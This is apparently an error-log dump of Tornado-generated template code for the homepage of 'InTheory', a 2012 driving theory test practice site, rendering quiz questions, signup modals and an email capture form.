186      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
187      _append(_tmp)  # home.html:21 (via base.html:76)
188      _append('}, { "question":"')  # home.html:21 (via base.html:76)
189      _tmp = kwargs["questions"][4].question  # home.html:21 (via base.html:76)
190      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
191      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
192      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
193      _append(_tmp)  # home.html:21 (via base.html:76)
194      _append('","options": ["')  # home.html:21 (via base.html:76)
195      _tmp = kwargs["questions"][4].options[0]  # home.html:21 (via base.html:76)
196      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
197      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
198      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
199      _append(_tmp)  # home.html:21 (via base.html:76)
200      _append('", "')  # home.html:21 (via base.html:76)
201      _tmp = kwargs["questions"][4].options[1]  # home.html:21 (via base.html:76)
202      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
203      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
204      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
205      _append(_tmp)  # home.html:21 (via base.html:76)
206      _append('", "')  # home.html:21 (via base.html:76)
207      _tmp = kwargs["questions"][4].options[2]  # home.html:21 (via base.html:76)
208      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
209      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
210      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
211      _append(_tmp)  # home.html:21 (via base.html:76)
212      _append('", "')  # home.html:21 (via base.html:76)
213      _tmp = kwargs["questions"][4].options[3]  # home.html:21 (via base.html:76)
214      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
215      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
216      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
217      _append(_tmp)  # home.html:21 (via base.html:76)
218      _append('"],"answer": ')  # home.html:21 (via base.html:76)
219      _tmp = kwargs["questions"][4].answer  # home.html:21 (via base.html:76)
220      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
221      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
222      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
223      _append(_tmp)  # home.html:21 (via base.html:76)
224      _append('},{ "question":"')  # home.html:21 (via base.html:76)
225      _tmp = kwargs["questions"][5].question  # home.html:21 (via base.html:76)
226      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
227      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
228      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
229      _append(_tmp)  # home.html:21 (via base.html:76)
230      _append('","options": ["')  # home.html:21 (via base.html:76)
231      _tmp = kwargs["questions"][5].options[0]  # home.html:21 (via base.html:76)
232      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
233      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
234      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
235      _append(_tmp)  # home.html:21 (via base.html:76)
236      _append('", "')  # home.html:21 (via base.html:76)
237      _tmp = kwargs["questions"][5].options[1]  # home.html:21 (via base.html:76)
238      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
239      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
240      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
241      _append(_tmp)  # home.html:21 (via base.html:76)
242      _append('", "')  # home.html:21 (via base.html:76)
243      _tmp = kwargs["questions"][5].options[2]  # home.html:21 (via base.html:76)
244      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
245      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
246      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
247      _append(_tmp)  # home.html:21 (via base.html:76)
248      _append('", "')  # home.html:21 (via base.html:76)
249      _tmp = kwargs["questions"][5].options[3]  # home.html:21 (via base.html:76)
250      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
251      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
252      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
253      _append(_tmp)  # home.html:21 (via base.html:76)
254      _append('"],"answer": ')  # home.html:21 (via base.html:76)
255      _tmp = kwargs["questions"][5].answer  # home.html:21 (via base.html:76)
256      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
257      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
258      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
259      _append(_tmp)  # home.html:21 (via base.html:76)
260      _append('}, { "question":"')  # home.html:21 (via base.html:76)
261      _tmp = kwargs["questions"][6].question  # home.html:21 (via base.html:76)
262      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
263      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
264      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
265      _append(_tmp)  # home.html:21 (via base.html:76)
266      _append('","options": ["')  # home.html:21 (via base.html:76)
267      _tmp = kwargs["questions"][6].options[0]  # home.html:21 (via base.html:76)
268      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
269      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
270      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
271      _append(_tmp)  # home.html:21 (via base.html:76)
272      _append('", "')  # home.html:21 (via base.html:76)
273      _tmp = kwargs["questions"][6].options[1]  # home.html:21 (via base.html:76)
274      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
275      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
276      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
277      _append(_tmp)  # home.html:21 (via base.html:76)
278      _append('", "')  # home.html:21 (via base.html:76)
279      _tmp = kwargs["questions"][6].options[2]  # home.html:21 (via base.html:76)
280      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
281      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
282      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
283      _append(_tmp)  # home.html:21 (via base.html:76)
284      _append('", "')  # home.html:21 (via base.html:76)
285      _tmp = kwargs["questions"][6].options[3]  # home.html:21 (via base.html:76)
286      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
287      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
288      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
289      _append(_tmp)  # home.html:21 (via base.html:76)
290      _append('"],"answer": ')  # home.html:21 (via base.html:76)
291      _tmp = kwargs["questions"][6].answer  # home.html:21 (via base.html:76)
292      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
293      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
294      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
295      _append(_tmp)  # home.html:21 (via base.html:76)
296      _append('},{ "question":"')  # home.html:21 (via base.html:76)
297      _tmp = kwargs["questions"][7].question  # home.html:21 (via base.html:76)
298      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
299      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
300      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
301      _append(_tmp)  # home.html:21 (via base.html:76)
302      _append('","options": ["')  # home.html:21 (via base.html:76)
303      _tmp = kwargs["questions"][7].options[0]  # home.html:21 (via base.html:76)
304      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
305      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
306      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
307      _append(_tmp)  # home.html:21 (via base.html:76)
308      _append('", "')  # home.html:21 (via base.html:76)
309      _tmp = kwargs["questions"][7].options[1]  # home.html:21 (via base.html:76)
310      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
311      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
312      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
313      _append(_tmp)  # home.html:21 (via base.html:76)
314      _append('", "')  # home.html:21 (via base.html:76)
315      _tmp = kwargs["questions"][7].options[2]  # home.html:21 (via base.html:76)
316      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
317      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
318      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
319      _append(_tmp)  # home.html:21 (via base.html:76)
320      _append('", "')  # home.html:21 (via base.html:76)
321      _tmp = kwargs["questions"][7].options[3]  # home.html:21 (via base.html:76)
322      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
323      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
324      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
325      _append(_tmp)  # home.html:21 (via base.html:76)
326      _append('"],"answer": ')  # home.html:21 (via base.html:76)
327      _tmp = kwargs["questions"][7].answer  # home.html:21 (via base.html:76)
328      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
329      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
330      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
331      _append(_tmp)  # home.html:21 (via base.html:76)
332      _append('}, { "question":"')  # home.html:21 (via base.html:76)
333      _tmp = kwargs["questions"][8].question  # home.html:21 (via base.html:76)
334      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
335      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
336      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
337      _append(_tmp)  # home.html:21 (via base.html:76)
338      _append('","options": ["')  # home.html:21 (via base.html:76)
339      _tmp = kwargs["questions"][8].options[0]  # home.html:21 (via base.html:76)
340      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
341      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
342      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
343      _append(_tmp)  # home.html:21 (via base.html:76)
344      _append('", "')  # home.html:21 (via base.html:76)
345      _tmp = kwargs["questions"][8].options[1]  # home.html:21 (via base.html:76)
346      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
347      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
348      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
349      _append(_tmp)  # home.html:21 (via base.html:76)
350      _append('", "')  # home.html:21 (via base.html:76)
351      _tmp = kwargs["questions"][8].options[2]  # home.html:21 (via base.html:76)
352      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
353      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
354      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
355      _append(_tmp)  # home.html:21 (via base.html:76)
356      _append('", "')  # home.html:21 (via base.html:76)
357      _tmp = kwargs["questions"][8].options[3]  # home.html:21 (via base.html:76)
358      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
359      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
360      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
361      _append(_tmp)  # home.html:21 (via base.html:76)
362      _append('"],"answer": ')  # home.html:21 (via base.html:76)
363      _tmp = kwargs["questions"][8].answer  # home.html:21 (via base.html:76)
364      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
365      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
366      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
367      _append(_tmp)  # home.html:21 (via base.html:76)
368      _append('},{ "question":"')  # home.html:21 (via base.html:76)
369      _tmp = kwargs["questions"][9].question  # home.html:21 (via base.html:76)
370      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
371      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
372      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
373      _append(_tmp)  # home.html:21 (via base.html:76)
374      _append('","options": ["')  # home.html:21 (via base.html:76)
375      _tmp = kwargs["questions"][9].options[0]  # home.html:21 (via base.html:76)
376      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
377      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
378      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
379      _append(_tmp)  # home.html:21 (via base.html:76)
380      _append('", "')  # home.html:21 (via base.html:76)
381      _tmp = kwargs["questions"][9].options[1]  # home.html:21 (via base.html:76)
382      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
383      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
384      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
385      _append(_tmp)  # home.html:21 (via base.html:76)
386      _append('", "')  # home.html:21 (via base.html:76)
387      _tmp = kwargs["questions"][9].options[2]  # home.html:21 (via base.html:76)
388      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
389      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
390      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
391      _append(_tmp)  # home.html:21 (via base.html:76)
392      _append('", "')  # home.html:21 (via base.html:76)
393      _tmp = kwargs["questions"][9].options[3]  # home.html:21 (via base.html:76)
394      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
395      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
396      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
397      _append(_tmp)  # home.html:21 (via base.html:76)
398      _append('"],"answer": ')  # home.html:21 (via base.html:76)
399      _tmp = kwargs["questions"][9].answer  # home.html:21 (via base.html:76)
400      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
401      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
402      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
403      _append(_tmp)  # home.html:21 (via base.html:76)
404      _append('}]\'>\n</div>\n<div id="answers" data-answers=\'[]\'></div>\n<div id="mini-quiz-box" class="undimmed">\n')  # home.html:25 (via base.html:76)
405      question = kwargs['questions'][0]  # home.html:25 (via base.html:76)
406      _append('\n<h4> ')  # home.html:26 (via base.html:76)
407      _tmp = question.question  # home.html:26 (via base.html:76)
408      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:26 (via base.html:76)
409      else: _tmp = _utf8(str(_tmp))  # home.html:26 (via base.html:76)
410      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:26 (via base.html:76)
411      _append(_tmp)  # home.html:26 (via base.html:76)
412      _append('</h4>\n<ul remaining-answers=')  # home.html:27 (via base.html:76)
413      _tmp = len(question.answer)  # home.html:27 (via base.html:76)
414      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:27 (via base.html:76)
415      else: _tmp = _utf8(str(_tmp))  # home.html:27 (via base.html:76)
416      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:27 (via base.html:76)
417      _append(_tmp)  # home.html:27 (via base.html:76)
418      _append(' class="nav nav-pills nav-stacked">\n<li><a class="choice" ind="0"><span class="badge badge-info">A</span> ')  # home.html:28 (via base.html:76)
419      _tmp = question.options[0]  # home.html:28 (via base.html:76)
420      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:28 (via base.html:76)
421      else: _tmp = _utf8(str(_tmp))  # home.html:28 (via base.html:76)
422      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:28 (via base.html:76)
423      _append(_tmp)  # home.html:28 (via base.html:76)
424      _append('</a></li>\n<li><a class="choice" ind="1"><span class="badge badge-info">B</span> ')  # home.html:29 (via base.html:76)
425      _tmp = question.options[1]  # home.html:29 (via base.html:76)
426      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:29 (via base.html:76)
427      else: _tmp = _utf8(str(_tmp))  # home.html:29 (via base.html:76)
428      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:29 (via base.html:76)
429      _append(_tmp)  # home.html:29 (via base.html:76)
430      _append('</a></li>\n<li><a class="choice" ind="2"><span class="badge badge-info">C</span> ')  # home.html:30 (via base.html:76)
431      _tmp = question.options[2]  # home.html:30 (via base.html:76)
432      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:30 (via base.html:76)
433      else: _tmp = _utf8(str(_tmp))  # home.html:30 (via base.html:76)
434      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:30 (via base.html:76)
435      _append(_tmp)  # home.html:30 (via base.html:76)
436      _append('</a></li>\n<li><a class="choice" ind="3"><span class="badge badge-info">D</span> ')  # home.html:31 (via base.html:76)
437      _tmp = question.options[3]  # home.html:31 (via base.html:76)
438      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:31 (via base.html:76)
439      else: _tmp = _utf8(str(_tmp))  # home.html:31 (via base.html:76)
440      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:31 (via base.html:76)
441      _append(_tmp)  # home.html:31 (via base.html:76)
442      _append('</a></li>\n</ul>\n<a id="next" class="btn btn-success btn-mini disabled">Next Question</a>\n</div>\n</div>\n</div>\n</div>\n</div>\n<div class="row">\n<div class="span10">\n</div>\n<div class="span5 offset5">\n</br></br>\n<blockquote>\n<p>\n<h2><div class="funkytext"><font color="#ffffff">"')  # home.html:47 (via base.html:76)
443      _tmp = kwargs['tweet']  # home.html:47 (via base.html:76)
444      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:47 (via base.html:76)
445      else: _tmp = _utf8(str(_tmp))  # home.html:47 (via base.html:76)
446      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:47 (via base.html:76)
447      _append(_tmp)  # home.html:47 (via base.html:76)
448      _append('"</h2>\n<div class="funkytext">- Dave Mason, London</font></div>\n</p>\n</blockquote>\n</div>\n</div>\n</div> <!-- /container -->\n<div id="dim">\n</div>\n')  # home.html:57 (via base.html:76)
449      _append('\n')  # base.html:80
450      _tmp = xsrf_form_html()  # base.html:80
451      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:80
452      else: _tmp = _utf8(str(_tmp))  # base.html:80
453      _append(_tmp)  # base.html:80
454      _append('\n')  # base.html:81
455      _append('\n<script src="')  # base.html:82 (via base.html:81)
456      _tmp = static_url('js/libs/jquery-1.7.2.min.js')  # base.html:82 (via base.html:81)
457      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:82 (via base.html:81)
458      else: _tmp = _utf8(str(_tmp))  # base.html:82 (via base.html:81)
459      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:82 (via base.html:81)
460      _append(_tmp)  # base.html:82 (via base.html:81)
461      _append('"></script>\n<script src="')  # base.html:83 (via base.html:81)
462      _tmp = static_url('js/libs/blurb.min.js')  # base.html:83 (via base.html:81)
463      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:83 (via base.html:81)
464      else: _tmp = _utf8(str(_tmp))  # base.html:83 (via base.html:81)
465      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:83 (via base.html:81)
466      _append(_tmp)  # base.html:83 (via base.html:81)
467      _append('"></script>\n<script src="')  # base.html:84 (via base.html:81)
468      _tmp = static_url('js/IT.js')  # base.html:84 (via base.html:81)
469      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:84 (via base.html:81)
470      else: _tmp = _utf8(str(_tmp))  # base.html:84 (via base.html:81)
471      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:84 (via base.html:81)
472      _append(_tmp)  # base.html:84 (via base.html:81)
473      _append('"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-dropdown.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-button.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-modal.js"></script>\n')  # base.html:88 (via base.html:81)
474      _append('\n')  # base.html:90
475      for js in kwargs['js_deps']:  # base.html:90
476          _append('\n<script src="')  # base.html:91
477          _tmp = static_url(js)  # base.html:91
478          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:91
479          else: _tmp = _utf8(str(_tmp))  # base.html:91
480          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:91
481          _append(_tmp)  # base.html:91
482          _append('"></script>\n')  # base.html:92
483      _append('\n')  # base.html:94
484      _append('\n<script id="signup-template" type="text/x-jquery-tmpl">\n<div id="windowTitleDialog" class="modal hide fade">\n<div class="modal-header">\n<a class="close">&times;</a>\n<h3>You scored ${score} out of 10!</h3>\n</div>\n<div class="modal-body">\n<p>You still need a little practice, but don\'t worry we\'re here to help you pass. Sign-up today to get started...</p>\n<a href="/login"><center><img src="')  # home.html:68 (via base.html:94)
485      _tmp = static_url('imgs/facebook.png')  # home.html:68 (via base.html:94)
486      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:68 (via base.html:94)
487      else: _tmp = _utf8(str(_tmp))  # home.html:68 (via base.html:94)
488      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:68 (via base.html:94)
489      _append(_tmp)  # home.html:68 (via base.html:94)
490      _append('" alt="some_text"/></a>\n<img src="')  # home.html:69 (via base.html:94)
491      _tmp = static_url('imgs/twitter.png')  # home.html:69 (via base.html:94)
492      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:69 (via base.html:94)
493      else: _tmp = _utf8(str(_tmp))  # home.html:69 (via base.html:94)
494      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:69 (via base.html:94)
495      _append(_tmp)  # home.html:69 (via base.html:94)
496      _append('" alt="some_text"/>\n<img src="')  # home.html:70 (via base.html:94)
497      _tmp = static_url('imgs/google.png')  # home.html:70 (via base.html:94)
498      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:70 (via base.html:94)
499      else: _tmp = _utf8(str(_tmp))  # home.html:70 (via base.html:94)
500      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:70 (via base.html:94)
501      _append(_tmp)  # home.html:70 (via base.html:94)
502      _append('" alt="some_text"/></center>\n<center><a href="h">Or click here to sign-up directly</a></center>\n</div>\n<div class="modal-footer">\n<ul class="pager">\n<li class="previous"><a href="#">Sign in to InTheory</a></li>\n<li class="next"><a href="#">Forgot username or password?</a></li>\n</ul>\n</div>\n</div>\n</script>\n<script id="show-arrow-template" type="text/x-jquery-tmpl">\n<div class="arrow-container">\n<img src="')  # home.html:84 (via base.html:94)
503      _tmp = static_url('imgs/arrow.png')  # home.html:84 (via base.html:94)
504      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:84 (via base.html:94)
505      else: _tmp = _utf8(str(_tmp))  # home.html:84 (via base.html:94)
506      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:84 (via base.html:94)
507      _append(_tmp)  # home.html:84 (via base.html:94)
508      _append('"/>\n</div>\n</script>\n<script id="email-template" type="text/x-jquery-tmpl">\n<div id="windowTitleDialog" class="modal hide fade">\n<div class="modal-header">\n<a class="close">&times;</a>\n<h3>You scored ${score} out of 10!</h3>\n</div>\n<div class="modal-body">\n<center>\n<p>Leave your email and we\'ll let you know when we launch!</p>\n<form method="post" class="af-form-wrapper" action="http://www.aweber.com/scripts/addlead.pl" >\n<div style="display: none;">\n<input type="hidden" name="meta_web_form_id" value="677441365" />\n<input type="hidden" name="meta_split_id" value="" />\n<input type="hidden" name="listname" value="intheory" />\n<input type="hidden" name="redirect" value="http://www.aweber.com/thankyou-coi.htm?m=video" id="redirect_b3be9783c304109a8d9d9ca013e7b651" />\n<input type="hidden" name="meta_adtracking" value="Waiting_List_/_Splash" />\n<input type="hidden" name="meta_message" value="1" />\n<input type="hidden" name="meta_required" value="name,email" />\n<input type="hidden" name="meta_tooltip" value="" />\n</div>\n<div id="af-form-677441365" class="af-form"><div id="af-body-677441365" class="af-body af-standards">\n<div class="af-element">\n<div class="af-textWrap"></br>\n<input id="awf_field-39151245" type="text" name="name" class="text" placeholder="Enter Your Name" tabindex="500" />\n</div>\n<div class="af-clear"></div></div>\n<div class="af-element">\n<div class="af-textWrap"><input class="text" id="awf_field-39151246" type="text" name="email" placeholder="Enter Your Email" tabindex="501" />\n</div><div class="af-clear"></div>\n</div>\n<input name="submit" class="btn btn-primaryw" type="submit" value="Submit" tabindex="502" />\n</br>\n<a href="/login">or connect with Facebook</a>\n</div>\n</br></br>\n<div class="af-element privacyPolicy" style="text-align: center"><p>We respect your <a title="Privacy Policy" href="http://www.aweber.com/permission.htm" target="_blank">email privacy</a></p>\n<div class="af-clear"></div>\n</div>\n</div>\n</div>\n<div style="display: none;"><img src="http://forms.aweber.com/form/displays.htm?id=bOzsLCyMzGys" alt="" /></div>\n</form>\n</center>\n<script type="text/javascript">\n<!--\n(function() {\nvar IE = /*@cc_on!@*/false;\nif (!IE) { return; }\nif (document.compatMode && document.compatMode == \'BackCompat\') {\nif (document.getElementById("af-form-677441365")) {\ndocument.getElementById("af-form-677441365").className = \'af-form af-quirksMode\';\n}\nif (document.getElementById("af-body-677441365")) {\ndocument.getElementById("af-body-677441365").className = "af-body inline af-quirksMode";\n}\nif (document.getElementById("af-header-677441365")) {\ndocument.getElementById("af-header-677441365").className = "af-header af-quirksMode";\n}\nif (document.getElementById("af-footer-677441365")) {\ndocument.getElementById("af-footer-677441365").className = "af-footer af-quirksMode";\n}\n}\n})();\n-->\n</script>\n</div>\n</div>\n</script>\n')  # home.html:158 (via base.html:94)
509      _append('\n<div class="container">\n<div class="footer"><font color="#FFFFFF" size="2px"> <p class="alignleft">InTheory Media Limited \xc2\xa9 2012</p>\n<p class="alignright">About Us | Terms & Conditions | Privacy Policy | Support </p></font></br>\n</div>\n</div>\n</body>\n</html>\n')  # base.html:106
510      return _utf8('').join(_buffer)  # base.html:0
ERROR:root:home.html code:
  1  def _execute():  # base.html:0
  2      _buffer = []  # base.html:0
  3      _append = _buffer.append  # base.html:0
  4      _append('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<!--[if lt IE 7 ]> <html lang="en" class="no-js ie6"> <![endif]-->\n<!--[if IE 7 ]> <html lang="en" class="no-js ie7"> <![endif]-->\n<!--[if IE 8 ]> <html lang="en" class="no-js ie8"> <![endif]-->\n<!--[if IE 9 ]> <html lang="en" class="no-js ie9"> <![endif]-->\n<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js"> <!--<![endif]-->\n<head xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml">\n<meta charset="utf-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\n<meta name="author" content="intheory">\n<meta name="description" content="Intheory 2012">\n<meta property="og:image" content="http://www.petrominpng.com.pg/images/logo_big.png" />\n<meta name="viewport" content="width=920, initial-scale=auto">\n<meta property="og:type" content="website" />\n<meta property="og:title" content="Intheory 2012" />\n<meta property="og:site_name" content="Intheory 2012" />\n<title>\n')  # base.html:19
  5      _append('\nInTheory | Pass Your Theory Test. Guaranteed.\n')  # base.html:21 (via base.html:19)
  6      _append('\n</title>\n<link href="../static/css/bootstrap.css" rel="stylesheet">\n<link href="../static/css/bootstrap-responsive.css" rel="stylesheet">\n<link rel="stylesheet" href="')  # base.html:25
  7      _tmp = static_url('css/base.css')  # base.html:25
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:25
  9      else: _tmp = _utf8(str(_tmp))  # base.html:25
 10      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:25
